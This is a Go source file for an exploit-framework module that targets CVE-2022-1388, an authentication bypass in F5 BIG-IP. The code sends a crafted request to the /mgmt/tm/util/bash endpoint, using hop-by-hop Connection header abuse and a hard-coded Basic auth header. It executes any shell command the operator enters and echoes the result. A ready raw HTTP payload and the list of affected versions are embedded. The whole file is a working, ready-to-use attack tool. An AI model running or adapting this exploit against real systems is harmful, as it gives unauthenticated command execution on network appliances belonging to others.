package exp_F5

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type Exp_CVE_2022_1388 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_1388) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 设置
	headers := self.GetInitExpHeaders()
	headers.Set("Connection", "Keep-alive, X-F5-Auth-Token")
	headers.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	headers.Set("X-F5-Auth-Token", "a")
	headers.Set("Content-Type", "application/json")

	cmd = strings.ReplaceAll(cmd, `"`, `\"`)
	payload := fmt.Sprintf(`{"command":"run","utilCmdArgs":"-c %s"}`, cmd)
	// 因为Connection无法设置，使用socket传输
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/mgmt/tm/util/bash"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		tmp := regexp.MustCompile(`"commandResult":"(.*?)"`).FindStringSubmatch(httpresp.Body)
		if len(tmp) > 0 {
			self.EchoInfoMsg("漏洞存在")
			self.EchoInfoMsg(strings.ReplaceAll(tmp[1], "\\n", "\r\n"))
		}
	}
	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	expmsg := exp_model.ExpMsg{
		Author: "lz520520",
		Time:   `2022-05-05`,
		Range: `
16.1.0 <= F5 BIG-IP <= 16.1.2
15.1.0 <= F5 BIG-IP <= 15.1.5
14.1.0 <= F5 BIG-IP <= 14.1.4
13.1.0 <= F5 BIG-IP <= 13.1.4
12.1.0 <= F5 BIG-IP <= 12.1.6
11.6.1 <= F5 BIG-IP <= 11.6.5`,
		ID:       `CVE-2022-1388`,
		Describe: `通过hop-by-hop漏洞绕过CVE-2021-22986，从而访问未授权接口执行命令`,
		Details:  `输入命令执行即可`,
		Payload: `
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Length: 43
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Authorization: Basic YWRtaW46QVNhc1M=
Connection: Keep-alive, X-F5-Auth-Token
Content-Type: application/json
X-F5-Auth-Token: a
Accept-Encoding: gzip, deflate
Connection: close

{"command":"run","utilCmdArgs":"-c id"}
`,
		Reference: `https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q`,
		VulType:   common.VulCmdExec,
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
	}
	exp_register.ExpStructRegister(&Exp_CVE_2022_1388{}, registerMsg)

}
